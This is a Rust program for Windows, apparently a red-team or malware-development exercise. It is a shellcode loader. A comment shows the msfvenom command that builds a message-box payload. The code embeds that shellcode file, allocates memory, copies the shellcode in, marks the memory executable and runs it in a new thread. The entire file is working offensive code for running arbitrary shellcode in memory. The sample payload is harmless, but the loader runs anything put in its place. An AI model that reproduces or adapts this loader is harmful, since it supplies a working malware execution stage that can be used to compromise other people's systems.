use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};

use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

#[cfg(target_os = "windows")]
fn main() {
    //msfvenom -p windows/x64/messagebox TEXT="Hey baby......." TITLE="from Lynk4" -f raw -o shellcode.bin
    let shellcode = include_bytes!("../shellcode.bin");
    let shellcode_size = shellcode.len();

    unsafe {

        //Allocating memory.......
        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        //Copy the shellcode to the memory we created....
        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);


        //Making memory executable...
        let mut oldprotect = PAGE_READWRITE;
        let res = VirtualProtect(
            addr,
            shellcode_size,
            PAGE_EXECUTE,
            &mut oldprotect
        );

        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        //Create thread
        let addr = transmute(addr);
        let thread = CreateThread(
            null(),
            0,
            addr,
            null(),
            0,
            null_mut()
        );

        if thread == 0 {
            panic!("[-]Create Thread Failed: {}!", GetLastError());
        }

        WaitForSingleObject(thread, WAIT_FAILED);


    }

}





